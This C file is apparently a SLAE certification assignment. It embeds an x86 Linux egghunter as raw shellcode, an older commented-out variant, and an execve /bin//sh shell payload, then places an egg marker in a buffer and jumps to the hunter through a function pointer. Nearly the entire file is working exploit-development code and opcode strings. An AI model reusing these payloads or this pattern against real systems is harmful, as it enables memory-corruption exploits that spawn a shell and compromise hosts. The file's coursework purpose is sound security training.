#include<stdio.h>
#include<string.h>
//Author: Aaron Weathersby
//SLAE #1488
//Handle: t0b0x0r
//github:https://github.com/t0b0rX0r/slae/upload/master/assignment4
//;Assignment #3- Egghunter
//created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

unsigned char code[] = \
"\x89\xe3\x31\xc0\x89\xe6\x89\xe7\x43\xb8\x43\x00\x00\x00\x89\xd9\xcd\x80\x3c\xf2\x74\x36\x81\x3b\x41\x41\x41\x41\x75\xea\x43\xeb\x00\x81\x3b\x41\x41\x41\x41\x75\xdf\x43\x89\xde\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x41\x91\x04\x08\xba\x0b\x00\x00\x00\xcd\x80\xff\xe6\x89\xde\x31\xc0\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x35\x91\x04\x08\xba\x0c\x00\x00\x00\x81\xc7\xff\x0f\x00\x00\x81\xc3\xff\x0f\x00\x00\xeb\x96\x89\xde\x31\xc0\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x35\x91\x04\x08\xba\x0c\x00\x00\x00\xcd\x80";
//Working"\x89\xe3\x31\xc0\x68\x41\x41\x41\x41\x89\xe6\x68\x41\x41\x41\x41\x89\xe7\x43\xb8\x43\x00\x00\x00\x89\xd9\xcd\x80\x3c\xf2\x74\x36\x81\x3b\x41\x41\x41\x41\x75\xea\x43\xeb\x09\x81\x3b\x41\x41\x41\x41\x75\xdf\x43\x89\xde\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x4d\x91\x04\x08\xba\x0b\x00\x00\x00\xcd\x80\xff\xe6\x89\xde\x31\xc0\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x41\x91\x04\x08\xba\x0c\x00\x00\x00\x81\xc7\xff\x0f\x00\x00\x81\xc3\xff\x0f\x00\x00\xeb\x96\x89\xde\x31\xc0\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x41\x91\x04\x08\xba\x0c\x00\x00\x00\xcd\x80";

unsigned char shell[]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; //exec


unsigned char egg[] = "\x41\x41\x41\x41";
main()
{
char buff[100];

	printf("Shellcode Length:  %d\n", strlen(code));	
	printf("Memory location of shellcode: %p\n", buff);

	strcpy(buff, egg); //save the egg
	strcpy(buff+4, egg); //save the egg a second time
	strcpy(buff+8,shell); //payload...exec opcode


	int (*ret)() = (int(*)())code;

	ret();

}

	
